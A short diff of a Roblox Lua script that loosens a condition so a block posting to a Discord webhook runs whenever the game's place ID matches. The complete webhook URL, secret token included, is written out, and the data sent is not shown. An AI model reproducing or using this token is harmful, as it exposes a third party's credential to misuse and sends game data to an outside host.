@@ -30,7 +30,7 @@ game:GetService("RunService").Heartbeat:Connect(function()
 end)
 
 for i,v in pairs(P) do
-	if v == game.PlaceId and game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
+	if v == game.PlaceId then
 		local url =
 			"https://discord.com/api/webhooks/1178148692465819740/TtOQMrMkqF6Tjpb_Rde-bTAJ5-x6qivmXXPFtIMWWTEcetUZBPuEaTGYVQYZ3wORz1AJ"
 		local data = {
